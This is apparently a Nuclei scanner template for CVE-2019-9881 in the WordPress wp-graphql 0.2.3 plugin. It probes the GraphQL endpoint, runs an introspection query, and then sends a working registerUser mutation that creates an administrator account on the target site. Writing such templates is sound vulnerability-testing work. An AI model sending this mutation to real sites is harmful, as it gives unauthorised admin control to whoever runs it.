id: CVE-2019-9881

info:
  name: WordPress GraphQL Authentication Bypass
  author: pdteam
  severity: critical
  description: |
    WordPress wp-graphql plugin version 0.2.3 contains an authentication bypass vulnerability that allows
    unauthenticated users to register admin accounts and access sensitive information through GraphQL queries.
  reference:
    - https://github.com/pentestpartners/snippets/blob/master/wp-graphql0.2.3_exploit.py
    - https://www.pentestpartners.com/security-blog/pwning-wordpress-graphql/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-9881
    cwe-id: CWE-287
  metadata:
    verified: true
    max-request: 3
  tags: cve,cve2019,wordpress,graphql,auth-bypass,privilege-escalation

http:
  - method: GET
    path:
      - "{{BaseURL}}/graphql"

    headers:
      Content-Type: application/json

    matchers:
      - type: word
        words:
          - "graphql"
          - "query"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/graphql"

    headers:
      Content-Type: application/json

    body: |
      {
        "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "registerUser"
          - "mutation"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/graphql"

    headers:
      Content-Type: application/json

    body: |
      {
        "query": "mutation { registerUser(input: { clientMutationId: \"test\", email: \"nuclei@test.local\", password: \"TestP@ssword123\", username: \"nucleitest\", roles: [\"administrator\"] }) { clientMutationId } }"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "clientMutationId"
          - "test"
        condition: and

      - type: word
        words:
          - "error"
        negative: true

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"wp-graphql/([0-9.]+)"'